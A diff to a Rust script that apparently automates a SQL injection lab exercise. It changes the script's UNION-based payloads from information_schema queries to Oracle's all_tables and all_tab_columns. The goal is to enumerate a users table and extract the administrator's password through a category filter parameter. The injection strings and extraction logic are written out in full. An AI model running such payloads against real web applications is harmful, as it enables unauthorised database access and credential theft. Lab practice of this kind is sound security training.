@@ -8,7 +8,7 @@ use std::iter::zip;
 use std::sync::LazyLock;
 
 static USERS_TABLE_REGEX: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"\busers_.+?\b").expect("[-] Failed to generate USERS_TABLE_REGEX")
+    Regex::new(r"\bUSERS_.+?\b").expect("[-] Failed to generate USERS_TABLE_REGEX")
 });
 
 static TABLE_TH_SELECTOR: LazyLock<Selector> = LazyLock::new(|| {
@@ -30,14 +30,14 @@ fn main() {
     let mut password_column_name: Option<String> = None;
     let administrator_password: Option<String>;
 
-    let columns = find_no_of_columns(&lab_url_with_endpoint, Some("-- -"), None);
+    let columns = find_no_of_columns(&lab_url_with_endpoint, None, Some(true));
 
-    find_columns_of_type_string(&lab_url_with_endpoint, columns, Some("-- -"), None);
+    find_columns_of_type_string(&lab_url_with_endpoint, columns, None, Some(true));
 
     logger::info("Finding the users table name");
-    logger::info("Fetching the information_schema.tables");
+    logger::info("Fetching the `all_tables`");
 
-    let query = "' UNION SELECT NULL, TABLE_NAME FROM information_schema.tables --";
+    let query = "' UNION SELECT NULL, TABLE_NAME FROM all_tables --";
 
     logger::info(format!("Making query: {}/filter?category={}", lab_url, query).as_ref());
 
@@ -71,17 +71,15 @@ fn main() {
     } else {
         panic!(
             "{}",
-            logger::error_return("Failed to fetch the information_schema.tables")
+            logger::error_return("Failed to fetch the `all_tables`")
         )
     }
 
     logger::info("Fetching the column names from the users table");
-    logger::info(
-        format!("Fetching the information_schema.columns for table {users_table_name}").as_ref(),
-    );
+    logger::info(format!("Fetching the `all_tab_columns` for table {users_table_name}").as_ref());
 
     let query = format!(
-        "' UNION SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE table_name='{}'--",
+        "' UNION SELECT COLUMN_NAME, DATA_TYPE FROM all_tab_columns WHERE table_name='{}'--",
         users_table_name
     );
 
@@ -113,10 +111,10 @@ fn main() {
             .collect();
 
         for column in &column_names {
-            if column.starts_with("password_") {
+            if column.starts_with("PASSWORD_") {
                 password_column_name = Some(column.to_string())
             }
-            if column.starts_with("username_") {
+            if column.starts_with("USERNAME_") {
                 username_column_name = Some(column.to_string())
             }
         }
@@ -133,9 +131,7 @@ fn main() {
     } else {
         panic!(
             "{}",
-            logger::error_return(
-                "Failed to fetch the information_schema.columns for the users table"
-            )
+            logger::error_return("Failed to fetch the `all_tab_columns` for the users table")
         )
     }
 
@@ -194,9 +190,7 @@ fn main() {
         } else {
             panic!(
                 "{}",
-                logger::error_return(
-                    "Failed to fetch the information_schema.columns for the users table"
-                )
+                logger::error_return("Failed to fetch the `all_tab_columns` for the users table")
             )
         }
     } else {
